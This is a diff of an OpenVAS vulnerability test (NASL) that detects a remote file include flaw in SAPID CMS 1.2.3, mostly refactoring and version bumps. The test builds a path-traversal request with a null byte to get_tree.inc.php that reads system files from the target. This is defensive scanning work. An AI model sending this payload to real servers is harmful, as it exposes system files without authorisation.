@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sapid_cms_51323.nasl 5640 2017-03-21 08:12:48Z cfi $
+# $Id: gb_sapid_cms_51323.nasl 5714 2017-03-24 10:52:48Z cfi $
 #
 # SAPID CMS Multiple Remote File Include Vulnerabilities
 #
@@ -36,22 +36,18 @@ attacks are also possible.
 
 SAPID CMS 1.2.3 is vulnerable; other versions may also be affected.";
 
-
 if (description)
 {
  script_id(103382);
  script_bugtraq_id(51323);
- script_version ("$Revision: 5640 $");
+ script_version ("$Revision: 5714 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("SAPID CMS Multiple Remote File Include Vulnerabilities");
-
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51323");
  script_xref(name : "URL" , value : "http://sapid.sourceforge.net/");
-
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 09:12:48 +0100 (Tue, 21 Mar 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 11:52:48 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-01-10 11:23:59 +0100 (Tue, 10 Jan 2012)");
- script_summary("Determine if installed SAPID CMS is vulnerable");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -67,27 +63,25 @@ include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!can_host_php(port:port))exit(0);
 files = traversal_files();
 
-dirs = make_list("/sapid","/cms",cgi_dirs());
+foreach dir( make_list_unique( "/sapid", "/cms", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
+  if( dir == "/" ) dir = "";
 
-  foreach file (keys(files)) {
-   
-    url = string(dir,"/usr/extensions/get_tree.inc.php?GLOBALS[root_path]=/",files[file],"%00"); 
+  foreach file( keys( files ) ) {
 
-    if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-      security_message(port:port);
-      exit(0);
+    url = dir + "/usr/extensions/get_tree.inc.php?GLOBALS[root_path]=/" + files[file] + "%00";
 
+    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
 
-exit(0);
+exit( 99 );
